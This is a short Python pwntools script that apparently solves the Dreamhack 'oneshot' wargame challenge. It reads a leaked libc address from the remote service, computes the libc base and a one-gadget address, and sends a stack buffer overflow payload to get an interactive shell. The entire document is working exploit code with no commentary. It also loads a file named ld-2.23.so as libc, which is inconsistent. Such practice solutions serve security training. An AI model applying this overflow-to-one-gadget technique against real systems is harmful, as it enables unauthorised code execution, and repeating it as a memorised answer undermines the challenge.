from pwn import *

exe = ELF('./oneshot_patched', checksec=False)
libc = ELF('./ld-2.23.so', checksec = False)
# p = process('./oneshot_patched')
p = remote("host8.dreamhack.games", 10585)

p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - 0x3c5620
oneshot = libc.address + 0x45216
log.info("stack leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))
payload = b'a'*0x18       
payload += p64(0)       
payload += b'a'*8   
payload += p64(oneshot)
p.sendafter(b"MSG: ", payload)

p.interactive()
